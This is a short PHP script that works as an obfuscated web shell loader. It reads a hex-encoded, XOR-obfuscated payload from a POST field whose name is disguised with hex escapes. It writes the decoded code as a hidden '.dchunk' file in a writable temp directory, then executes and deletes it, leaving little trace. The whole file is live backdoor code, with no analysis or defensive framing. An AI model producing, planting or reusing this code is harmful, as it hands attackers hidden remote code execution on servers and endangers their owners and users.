<?php

if(array_key_exists("\x65nti\x74\x79", $_POST)){
	$record = hex2bin($_POST["\x65nti\x74\x79"]);
	$fac = '';$z = 0; do{$fac .= chr(ord($record[$z]) ^ 80);$z++;} while($z < strlen($record));
	$mrk = array_filter([getcwd(), session_save_path(), ini_get("upload_tmp_dir"), "/dev/shm", "/var/tmp", getenv("TEMP"), sys_get_temp_dir(), getenv("TMP"), "/tmp"]);
	foreach ($mrk as $itm):
    		if (array_product([is_dir($itm), is_writable($itm)])) {
    $obj = str_replace("{var_dir}", $itm, "{var_dir}/.dchunk");
    if (@file_put_contents($obj, $fac) !== false) {
	include $obj;
	unlink($obj);
	exit;
}
}
endforeach;
}